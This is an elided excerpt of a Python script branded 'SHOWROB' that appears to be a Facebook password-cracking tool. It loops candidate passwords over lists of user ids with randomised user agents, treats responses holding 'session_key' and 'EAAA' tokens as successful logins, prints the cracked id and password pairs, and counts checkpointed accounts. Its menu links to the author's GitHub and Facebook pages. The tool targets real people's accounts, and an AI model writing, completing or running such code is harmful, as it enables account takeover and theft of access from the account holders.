...
logo = ("""\033[1;36m
▒ _____ _    _  ______          _______   ____  ____
  / ____| |  | |/ __ \ \        / /  __ \ / __ \|  _ \
 | (___ | |__| | |  | \ \  /\  / /| |__) | |  | | |_) |
  \___ \|  __  | |  | |\ \/  \/ / |  _  /| |  | |  _ <
  ____) | |  | | |__| | \  /\  /  | | \ \| |__| | |_) |
...
class Main:
	def __init__(self):
		...
		if DEVIL in ["1", "01"]:
			self.fbtua()
		if DEVIL in ["2", "02"]:
			os.system('xdg-open https://github.com/SHOWROB-CYBER')
		if DEVIL in ["3", "03"]:
			os.system('xdg-open https://www.facebook.com/its.showrob.bbz/')
		if DEVIL in ["4", "04"]:
	...
	def fbtua(self):
		...
		try:
			...
			exit("\n\n \033[0;95m>>[PROCESS COMPLETE... \n\033[0;92m >>[Thanks For Using Showrob Tools...")
		except Exception as e:exit(str(e))
 
	def api(self, uid, pwx):
		ua = random.choice(ugen)	
		sys.stdout.write(
			"\r\r %s\033[92;1m[SHOWROB] : %s/%s -> \033[0;92m [ OK:%s ]- \033[0;91m[CP:%s ]"%(B,self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[1;32m   [SHOWROB] %s | %s\033[1;32m         "%(uid, pw))
